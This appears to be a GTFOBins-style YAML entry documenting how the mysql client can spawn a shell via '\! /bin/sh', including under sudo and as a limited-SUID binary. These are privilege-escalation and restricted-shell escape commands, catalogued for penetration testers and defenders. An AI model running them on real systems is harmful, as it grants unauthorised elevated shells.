---
description: A valid MySQL server must be available.
functions:
  shell:
    - code: mysql -e '\! /bin/sh'
  sudo:
    - code: sudo mysql -e '\! /bin/sh'
  limited-suid:
    - code: ./mysql -e '\! /bin/sh'
---
